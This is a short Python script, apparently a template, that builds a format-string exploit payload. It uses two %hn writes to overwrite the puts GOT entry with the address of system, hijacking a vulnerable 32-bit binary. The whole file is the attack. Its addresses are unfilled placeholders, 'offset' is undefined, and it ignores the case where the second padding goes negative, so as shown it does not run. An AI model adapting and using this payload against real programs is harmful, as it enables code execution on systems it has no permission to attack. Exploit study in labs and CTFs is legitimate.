import sys
import struct

puts_got = {puts@got}
system_addr = {system addr}

payload = b""

payload += struct.pack("<I", puts_got)
payload += struct.pack("<I", puts_got + 2)

low = system_addr & 0xffff
high = (system_addr >> 16) & 0xffff

written = 8

pad1 = low - written
pad2 = high - low

payload += f"%{pad1}c%{offset}$hn".encode()
payload += f"%{pad2}c%{offset+1}$hn".encode()

sys.stdout.buffer.write(payload)
